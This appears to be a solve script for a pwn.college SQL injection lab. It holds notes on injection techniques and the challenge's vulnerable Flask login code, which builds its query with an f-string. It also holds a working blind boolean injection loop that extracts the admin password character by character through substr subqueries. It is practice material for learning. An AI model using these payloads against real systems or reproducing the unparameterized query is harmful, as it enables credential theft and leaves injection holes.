import os
import re
import requests
import string
import sys


"""
Theory:
We can yous multiple ways to manipulate queries with injected sql.
- comments i.e. password = '' OR TRUE --'
- chaining queries i.e. SELECT username FROM users WHERE
  username LIKE "%" UNION SELECT password FROM users WHERE username = "admin" --"
- subqueries OR (SELECT password FROM users WHERE username = "admin") LIKE "pwn.c%"
- leaking db structure  i.e. SELECT tbl_name FROM sqlite_master WHERE type="table"
- leaking by behavior i.e. Sometimes, even if the actual data is not shown, you can
  recover one bit! If the result of a query can make the application act two different
  ways (say, redirecting to an "Authentication Success" page versus an "Authentication Failure" page),
  then an attacker can carefully craft yes/no questions that they can get answers to.
"""

'''
#!/opt/pwn.college/python

import tempfile
import sqlite3
import flask
import os

app = flask.Flask(__name__)

class TemporaryDB:
    def __init__(self):
        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")

    def execute(self, sql, parameters=()):
        connection = sqlite3.connect(self.db_file.name)
        connection.row_factory = sqlite3.Row
        cursor = connection.cursor()
        result = cursor.execute(sql, parameters)
        connection.commit()
        return result

db = TemporaryDB()
# https://www.sqlite.org/lang_createtable.html
db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
# https://www.sqlite.org/lang_insert.html
db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")

@app.route("/", methods=["POST"])
def challenge_post():
    username = flask.request.form.get("username")
    password = flask.request.form.get("password")
    if not username:
        flask.abort(400, "Missing `username` form parameter")
    if not password:
        flask.abort(400, "Missing `password` form parameter")

    try:
        # https://www.sqlite.org/lang_select.html
        query = f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"'
        print(f"DEBUG: {query=}")
        user = db.execute(query).fetchone()
    except sqlite3.Error as e:
        flask.abort(500, f"Query: {query}\nError: {e}")

    if not user:
        flask.abort(403, "Invalid username or password")

    flask.session["user"] = username
    return flask.redirect(flask.request.path)

@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.session.get("user", None)):
        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
    else:
        page = f"<html><body>Hello, {username}!"

    return page + """
        <hr>
        <form method=post>
        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
        </form>
        </body></html>
    """

app.secret_key = os.urandom(8)
app.config['SERVER_NAME'] = f"challenge.localhost:80"
app.run("challenge.localhost", 80)
'''

alphabet = string.ascii_letters + string.digits + "-_.{}"
j = 0
guess = None
flag = "pwn.college{"
pat0 = re.compile(r".*Press CTRL.*\n")
# we use a pty to change the python subprocess stdout buffering to line buffered
# otherwise pythons default buffering would be used, which would write server prints
# in batches making it hard to link them to the respective requests to the server.
mfd, sfd = os.openpty()
pid = os.fork()

if pid == -1:
	print("Error fork.", file=sys.stderr)
	exit(1)

if pid == 0:
	os.close(mfd)

	os.dup2(sfd, 0)
	os.dup2(sfd, 1)
	os.dup2(sfd, 2)
	os.close(sfd)

	os.execv("/challenge/server", ["/challenge/server"])
	print("Error execv.", file=sys.stderr)
	exit(1)

os.close(sfd)

read_file = os.fdopen(mfd, "r")

# check server running
while True:
	line = read_file.readline()
	print(line, end="")

	m = pat0.match(line)
	if m:
		break

while True:
	guess = flag + alphabet[j]
	url = "http://challenge.localhost:80/"
	# we use substr since LIKE is not case sensitive
	data = {"username": "admin", "password": f'" OR (SELECT substr(password,1,{len(guess)}) FROM users WHERE username = "admin") = "{guess}" --'}
	print(data["password"])
	resp = requests.post(url, data=data, allow_redirects=False)
	# clear stdout to prevent server freeze
	print(read_file.readline())
	print(read_file.readline())

	if resp.status_code == 403:
		print(f"{guess} {j} 403")
		j +=1

	if resp.status_code == 302:
		print(f"{guess} {j} 302")
		flag = guess
		j = 0
		print(f"Your flag: {flag}")

	if flag[-1] == "}" or j >= len(alphabet):
		break
